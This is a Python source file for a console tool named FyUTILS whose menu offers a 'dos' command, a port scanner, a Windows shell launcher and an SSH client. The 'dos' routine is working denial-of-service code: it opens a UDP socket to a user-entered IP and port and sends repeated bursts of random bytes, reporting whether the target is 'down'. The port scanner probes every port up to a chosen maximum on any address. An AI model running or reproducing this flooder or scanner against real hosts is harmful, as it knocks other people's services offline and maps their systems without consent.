import os
import platform
import random
import socket
import sys
import time
import getpass
import keyboard
import paramiko
import requests

from datetime import datetime
from colorama import Fore, init

init(convert=True)


def now():
    now = datetime.now()
    current_time = now.strftime("[%H:%M:%S] ")
    return Fore.CYAN + current_time + Fore.WHITE


fullscreen = False
onlinemode = True
for i in range(99999):

    # Starting animation
    os.system("cls")
    time.sleep(0.05)
    print(Fore.CYAN + "  _____           _   _   _____   ___   _       ____                        _____  ")
    time.sleep(0.05)
    print(Fore.CYAN + " |  ___|  _   _  | | | | |_   _| |_ _| | |     / ___|              __   __ |___  | ")
    time.sleep(0.05)
    print(Fore.CYAN + " | |_    | | | | | | | |   | |    | |  | |     \___ \     _____    \ \ / /    / /  ")
    time.sleep(0.05)
    print(Fore.CYAN + " |  _|   | |_| | | |_| |   | |    | |  | |___   ___) |   |_____|    \ V /    / /   ")
    time.sleep(0.05)
    print(Fore.CYAN + " |_|      \__, |  \___/    |_|   |___| |_____| |____/                \_/    /_/    ")
    time.sleep(0.05)
    print(Fore.CYAN + "          |___/  ")
    time.sleep(0.05)

    # Main Menu Box
    if fullscreen == False:
        print(Fore.LIGHTBLACK_EX + "=" * 120)
    else:
        print(Fore.LIGHTBLACK_EX + "=" * 237)
    time.sleep(0.05)
    print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Setting variables...", end='\r')
    time.sleep(0.2)

    # Variable setter
    user = os.getlogin()
    device = platform.node()

    try:
        publicip = requests.get("https://api.ipify.org/").content.decode("UTF8")
    except:
        onlinemode = False

    privateip = socket.gethostbyname(socket.gethostname())
    processor = platform.processor()

    time.sleep(0.05)
    print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Variables set!      ")
    time.sleep(0.1)
    print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "User: " + user)
    time.sleep(0.05)
    print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Device: " + device)
    time.sleep(0.05)
    if onlinemode == True:
        print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Public IP: " + publicip)
        time.sleep(0.05)
    print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Private IP: " + privateip)
    time.sleep(0.05)
    print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "CPU: " + processor)
    time.sleep(0.05)
    print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "OnlineMode: " + str(onlinemode))
    time.sleep(0.05)
    print(Fore.CYAN + "[VARIABLE] " + Fore.WHITE + "Fullscreen: " + str(fullscreen))
    time.sleep(0.05)
    if fullscreen == False:
        print(Fore.LIGHTBLACK_EX + "=" * 120)
    else:
        print(Fore.LIGHTBLACK_EX + "=" * 237)
    time.sleep(0.05)
    print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "Loading commands...", end='\r')
    time.sleep(0.8)
    print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "Commands available:     ")
    time.sleep(0.1)
    print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "dos: Starts a distribute denial of service (DDoS) attack.")
    time.sleep(0.05)
    print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "cmd: Emulates a Windows batch shell.")
    time.sleep(0.05)
    print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "portscan: Finds all open ports of an IP address.")
    time.sleep(0.05)
    print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "ssh: Opens a SSH connection between your PC and a server/pc.")
    time.sleep(0.05)
    print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "full: Toggles full-screen.")
    time.sleep(0.05)
    print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "exit: Shuts down FyUTILS.")
    time.sleep(0.05)
    print(Fore.CYAN + "[COMMANDS] " + Fore.WHITE + "restart: Restarts FyUTILS.")
    time.sleep(0.05)
    if fullscreen == False:
        print(Fore.LIGHTBLACK_EX + "=" * 120)
    else:
        print(Fore.LIGHTBLACK_EX + "=" * 237)
    print("")
    cmd = input(Fore.WHITE + user + Fore.LIGHTBLACK_EX + "/" + Fore.WHITE + "FyUTILS" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN)

    # Command-Tabs

    if cmd == "dos":
        sckt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        print("")
        if fullscreen == False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        time.sleep(0.05)
        dosip = input(Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN)
        time.sleep(0.05)
        dosport = int(input(Fore.WHITE + "Target Port" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN))
        time.sleep(0.05)
        dosqueries = int(input(Fore.WHITE + "Attacks" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN))
        time.sleep(0.05)
        if fullscreen == False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        time.sleep(0.05)
        print("")

        sckt.connect((dosip, dosport))

        print(Fore.WHITE + "Starting attack on: " + Fore.CYAN + dosip + ":" + str(dosport))
        print("")
        if fullscreen == False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
            print(now() + "Preparing attack...", end='\r')
            time.sleep(1.5)
        try:
            for i in range(dosqueries + 1):
                randombytes = random.randbytes(10) * 1000
                sckt.send(randombytes)
                print(Fore.GREEN + "[+] " + now() + "Transferring bytecode... " + Fore.CYAN + str(i) + Fore.LIGHTBLACK_EX + " - " + Fore.GREEN + "Target reachable")
        except:
            print(Fore.RED + "[-] " + now() + "Transferring bytecode... " + Fore.CYAN + str(i) + Fore.LIGHTBLACK_EX + " - " + Fore.RED + "Target down")

        time.sleep(1)
        print("")
        print(now() + "Disconnecting from target...")
        time.sleep(1)

    if cmd == "cmd":
        print("")
        if fullscreen ==False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        time.sleep(0.05)
        print(Fore.WHITE + "Windows BATCH shell emulator - exit to get back")
        time.sleep(0.05)
        if fullscreen == False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        time.sleep(0.05)
        print(Fore.WHITE + "")
        os.system("cmd")
        time.sleep(0.05)

    if cmd == "portscan":
        print("")
        if fullscreen == False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        time.sleep(0.05)
        porttarget = input(Fore.WHITE + "Target IP" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN)
        time.sleep(0.05)
        portmax = input(Fore.WHITE + "Max. Port" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN)
        time.sleep(0.05)
        if fullscreen == False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        print(Fore.WHITE + "")
        try:

            for port in range(1, int(portmax)):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(0.01)

                print(Fore.WHITE + "Checking ports... " + Fore.CYAN + str(port), end='\r')
                result = s.connect_ex((porttarget, port))
                if result == 0:
                    print(Fore.WHITE + "Port " + Fore.CYAN + f"{port}" + Fore.WHITE + " is open!        ")
                s.close()
            os.system("pause")

        except KeyboardInterrupt:
            print(Fore.WHITE + "\n Operation failed.")
            time.sleep(1)

        except socket.gaierror:
            print(Fore.WHITE + "\n Hostname could not be resolved.")
            time.sleep(1)

        except socket.error:
            print(Fore.WHITE + "\n Server not responding.")
            time.sleep(1)

    if cmd == "ssh":
        print("")
        if fullscreen == False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        time.sleep(0.05)
        sshtarget = input(Fore.WHITE + "Target IP/Hostname" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN)
        time.sleep(0.05)
        sshport = int(input(Fore.WHITE + "Target Port" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN))
        time.sleep(0.05)
        sshuser = input(Fore.WHITE + "Username" + Fore.LIGHTBLACK_EX + " >> " + Fore.CYAN)
        time.sleep(0.05)
        sshpass = getpass.getpass(Fore.WHITE + "Password" + Fore.LIGHTBLACK_EX + " >> " + "")
        time.sleep(0.05)
        if fullscreen == False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        print(Fore.WHITE + "")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(sshtarget, sshport, sshuser, sshpass)

        sshexitvar = 1000
        for i in range(sshexitvar):
            sshcommand = input("FySSH > ")
            if sshcommand == "exit":
                time.sleep(1)
                break
            stdin, stdout, stderr = ssh.exec_command(sshcommand)
            print(stdout.readlines())

    if cmd == "full":
        print("")
        if fullscreen == True:
            fullscreen = False
        else:
            fullscreen = True

        keyboard.press_and_release("f11")

    if cmd == "exit":
        print("")
        if fullscreen ==False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        time.sleep(0.05)
        print(Fore.WHITE + "FyUTILS will shutdown in 3 seconds.")
        time.sleep(0.05)
        if fullscreen ==False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        time.sleep(0.05)
        print("")
        print(Fore.WHITE + "Shutdown in 3", end='\r')
        time.sleep(1)
        print(Fore.WHITE + "Shutdown in 2", end='\r')
        time.sleep(1)
        print(Fore.WHITE + "Shutdown in 1")
        time.sleep(1)
        exit()

    if cmd == "restart":
        print("")
        if fullscreen ==False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        time.sleep(0.05)
        print(Fore.WHITE + "FyUTILS will restart in 3 seconds.")
        time.sleep(0.05)
        if fullscreen ==False:
            print(Fore.LIGHTBLACK_EX + "=" * 120)
        else:
            print(Fore.LIGHTBLACK_EX + "=" * 237)
        time.sleep(0.05)
        print("")
        print(Fore.WHITE + "Restart in 3", end='\r')
        time.sleep(1)
        print(Fore.WHITE + "Restart in 2", end='\r')
        time.sleep(1)
        print(Fore.WHITE + "Restart in 1")

    time.sleep(1)
